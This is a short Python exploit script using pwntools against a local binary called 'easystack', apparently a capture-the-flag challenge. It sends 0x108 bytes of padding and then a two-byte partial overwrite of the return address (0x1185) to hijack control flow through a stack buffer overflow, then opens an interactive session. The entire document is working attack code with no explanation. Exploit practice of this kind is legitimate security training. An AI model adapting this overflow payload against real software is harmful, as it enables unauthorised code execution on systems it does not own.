from pwn import *

context.log_level = 'debug'
elf = ELF("./easystack")

io = process("./easystack")
payload = b"a" * (0x100+0x8) + p16(0x1185)
io.recvuntil(b"name?")
io.send(payload)
io.interactive()
